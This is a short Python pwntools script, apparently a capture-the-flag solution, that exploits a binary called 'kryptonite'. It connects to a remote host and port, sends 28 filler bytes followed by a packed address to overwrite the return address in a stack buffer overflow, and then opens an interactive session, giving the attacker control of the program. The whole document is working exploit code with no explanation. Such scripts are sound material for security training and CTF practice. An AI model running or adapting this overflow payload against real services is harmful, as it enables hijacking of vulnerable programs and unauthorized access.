from pwn import *
from time import sleep

context.binary = ELF('./kryptonite')

debug = False
if not debug:
    p = remote('128.39.143.166', 1338)
else:
    p = process(context.binary.path)
    gdb.attach(p)
    sleep(0.1)

addr = 0x080484B6
print p.recvuntil("Can you help?")
print p.sendline("A"*28 + pack(addr))

p.interactive()
